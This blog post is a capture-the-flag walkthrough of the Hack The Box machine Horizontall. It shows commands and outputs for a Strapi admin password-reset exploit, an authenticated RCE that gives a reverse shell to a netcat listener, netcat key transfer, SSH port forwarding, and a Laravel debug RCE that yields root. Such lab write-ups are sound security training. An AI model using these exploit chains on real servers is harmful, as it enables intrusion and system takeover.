---
layout: post
title: "HTB - Horizontall"
author: "joelczk"
tags: HTB
excerpt_separator: <!--more-->
---

Horizontall is a easy difficulty HTB box and personally, I also think that this box is of an easy difficulty. In my own opinion, I think that the difficulty in exploiting this box would be to find out the CVE that we should be using.  

<!--more-->

## HTB -Horizontall
**Box** : Horizontall\
**IP Address** : 10.10.11.105\
**Operating System** : Linux

## Remarks
- Take some time to research more about the CVEs, especially the newer CVEs that are publicly accessible since most of them might not be found on exploitDB
- ExploitDB and Google are your best pals:-)

## Enumeration

Just like any other box, we will first start off with doing a Nmap scan of the IP address. However, for this box, we were not able to find anything interesting about the open ports. The only ports that are open for this case are mainly ports 22 and 80.

## Discovery

Before we delve into finding the endpoints for the web service, we have to add the IP address to our ```/etc/hosts``` file. 

```
10.10.11.105    horizontall.htb 
```

First, we will try to enumerate the endpoints on http://horizontall.htb to find any endpoints that are of interest to us. Unfortunately, most of the endpoints are either not publicly accessible or of no interest to us. 

Next,we will try to enumerate for possible subdomains using Gobuster. From there, we were able to discover another subdomain http://api-prod.horizontall.htb, which we will add to the ```/etc/hosts``` file. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo gobuster vhost -u http://horizontall.htb -w /home/kali/Desktop/subdomains.txt -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://horizontall.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /home/kali/Desktop/subdomains.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/18 22:18:14 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
                                                         
===============================================================
2021/09/18 22:29:02 Finished
===============================================================
```

Now that we have obtained the subdomain, we will enumerate for possible endpoints on the subdomains using Gobuster. From the output, we discovered many sites of interest to us with a status code of 200. 

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/18 22:25:29 Starting gobuster in directory enumeration mode
===============================================================
http://api-prod.horizontall.htb/reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/users                (Status: 403) [Size: 60] 
http://api-prod.horizontall.htb/admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/Reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/Users                (Status: 403) [Size: 60] 
http://api-prod.horizontall.htb/Admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/REVIEWS              (Status: 200) [Size: 507]
```

However, we realize that visiting any site of interest will redirect us to the ```/admin/auth/login``` endpoint which appears to be a Strapi admin login page. Researching more on Strapi, we realize that Strapi is a CMS and we can discover the version information by making a curl command to ```/admin/StrapiVersion```

```
┌──(kali㉿kali)-[~]
└─$ curl http://api-prod.horizontall.htb/admin/strapiVersion
{"strapiVersion":"3.0.0-beta.17.4"}  
```

However, we do not know the credentials to login to the admin page yet. After some research, we realize that Strapi is vulnerable to CVE-2019-11818 that allows us to reset the password for any authenticated user.

After obtaining the exploit code for CVE-2019-11818 from [here](https://www.exploit-db.com/exploits/50237), we will have to modify the URL in the exploit code. However, we realize that we are unable to just use any email and be able to login to the admin page. After a few guesses, we managed to guess the admin email (```admin@horizontall.htb```) and managed to reset the password for the user.

```
┌──(kali㉿kali)-[~/Desktop/cve/CVE-2019-18818]
└─$ python3 exploit.py                                                              2 ⚙
[*] strapi version: 3.0.0-beta.17.4
[*] Password reset for user: admin@horizontall.htb
[*] Setting new password
[+] New password 'password' set for user admin@horizontall.htb
```

Capturing the request when authenticate as ```admin@horizontall.htb```, we realize that the endpoint ```/admin/auth/local``` sends the JWT token in its response

![Exposure of JWT token in response](../assets/horizontall/jwt_burp.png)

## Obtaining the user flag

After more research, we also release that this version of Strapi is vulnerable to CVE-2019-19609, which is an authenticated remote code execution. Obtaining the exploitation script from [here](https://github.com/diego-tella/CVE-2019-19609-EXPLOIT/blob/main/exploit.py), we will then be able to obtain a reverse shell in our local machine. (NOTE: The exploit script might fail sometimes, changing the port number or restarting the box might be able to resolve the problem)

```
┌──(kali㉿kali)-[~/Desktop/cve/CVE-2019-19609]
└─$ python3 exploit.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMyMDI0MjM2LCJleHAiOjE2MzQ2MTYyMzZ9.Ua4b3mL761BCC3gTwYcpyxA9FyLdTvQqPxS1zuJb2qM -l 10.10.16.7 -p 3000
[+] Exploit for Remote Code Execution for strapi-3.0.0-beta.17.7 and earlier (CVE-2019-19609)
[+] Remember to start listening to the port 3000 to get a reverse shell
[+] Sending payload... Check if you got shell
[+] Payload sent. Response:
<Response [504]>
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

Next, all we have to do is to stabilize the shell and obtain the user flag.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000  
listening on [any] 3000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.105] 57282
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
strapi@horizontall:~/myapi$ export TERM=xterm
export TERM=xterm
strapi@horizontall:~/myapi$ stty cols 132 rows 34
stty cols 132 rows 34
strapi@horizontall:~/myapi$ cd /home/developer
cd /home/developer
strapi@horizontall:/home/developer$ ls
ls
composer-setup.php  myproject  user.txt
strapi@horizontall:/home/developer$ cat user.txt
cat user.txt
<Redacted user flag>
strapi@horizontall:/home/developer$ 
```

## Obtaining root flag

Now, we will then navigate to the ```/myapi``` directory to execute Linpeas script to identify potential privilege escalation vectors.

```
strapi@horizontall:~/myapi$ ./linpeas.sh
./linpeas.sh
bash: ./linpeas.sh: Permission denied
strapi@horizontall:~/myapi$ chmod 777 linpeas.sh
chmod 777 linpeas.sh
strapi@horizontall:~/myapi$ ./linpeas.sh
```

From the output, we were able to identify suspicious service running on port 8000 on the localhost. Running a curl command on the http://localhost:8000 also reveals a ```Laravelv8(PHP v7.4.18)``` running on the web service.

![](../assets/horizontall/suspicious_localhost.png)

```
                    </div>

                    <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
                            Laravel v8 (PHP v7.4.18)
                    </div>
                </div>
            </div>
```

However, there is a problem now! We are unable to access the web service on our local machine and so, we are unable to execute any exploits on this web service. As such, we will have to do port-forwarding so that our local machine can access the localhost. 

First, we will have to generate an SSH key using ```ssh-keygen``` and host it on our local machine.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh-keygen                                                                      2 ⚙
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:QOcxDF7MwRGe9NOBmtlG1lYxoxxSGg2f1qX2cRe8rJ4 kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|      o*X++*+.*o.|
|     o *==+B+* *.|
|      o +B+.B =.+|
|       .+ oo . ++|
|        S.    . .|
|             .   |
|            . .  |
|             E   |
|                 |
+----[SHA256]-----+
                                                                                        
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 6060 < /home/kali/.ssh/id_rsa                                          2 ⚙
listening on [any] 6060 ...
```

Next, we realize that the user ```strapi``` has write permissions on ```/opt``` and we will navigate to the ```/opt``` directory.

```
strapi@horizontall:~/myapi$ ls -la /opt         
ls -la /opt
total 12
drwxr-xr-x  3 root   root   4096 May 26 14:24 .
drwxr-xr-x 24 root   root   4096 Aug 23 11:29 ..
drwxr-xr-x 10 strapi strapi 4096 Sep 19 04:29 strapi
strapi@horizontall:~/myapi$ cd /opt/strapi
cd /opt/strapi
```

Lastly, we will obtain the SSH public key from the local machine and add it to the authorized keys on the SSH terminal. 

```
strapi@horizontall:~$ mkdir ~/.ssh
mkdir ~/.ssh
strapi@horizontall:~$ cd .ssh
cd .ssh
strapi@horizontall:~/.ssh$ nc -nv 10.10.16.7 6060 > authorized_keys
nc -nv 10.10.16.7 6060 > authorized_keys
Connection to 10.10.16.7 6060 port [tcp/*] succeeded!
```

Afterwards, we will execute the port-forwarding on our local machine. We should be able to realize that we will now be able to view the Laravel page on http://127.0.0.1:8000

```
┌──(kali㉿kali)-[~/Desktop/cve/CVE-2019-19609]
└─$ ssh -i ~/.ssh/id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb              3 ⚙
Last login: Sun Sep 19 05:14:43 2021 from 10.10.14.24
$ 
```

![Laravel page on localhost](../assets/horizontall/laravel_page.png)

After even more researching, we realize that this version of Laravel used is vulnerable to CVE-2021-312(More details are available [here](https://www.ambionics.io/blog/laravel-debug-rce)). Next, all we have to do is to obtain the exploit code from [here](https://github.com/zhzyker/CVE-2021-3129) and modify the gadget chains to read the root flag.

```
┌──(kali㉿kali)-[~/Desktop/CVE-2021-3129]
└─$ python3 exp.py http://127.0.0.1:8000/
[*] Try to use Laravel/RCE1 for exploitation.
[+]exploit:
[*] Laravel/RCE1 Result:


[*] Try to use Laravel/RCE2 for exploitation.
[+]exploit:
[*] Laravel/RCE2 Result:


[*] Try to use Laravel/RCE3 for exploitation.
[+]exploit:
[*] Laravel/RCE3 Result:


[*] Try to use Laravel/RCE4 for exploitation.
[+]exploit:
[*] Laravel/RCE4 Result:


[*] Try to use Laravel/RCE5 for exploitation.
[+]exploit:
[*] Laravel/RCE5 Result:

<Redacted system flag>
```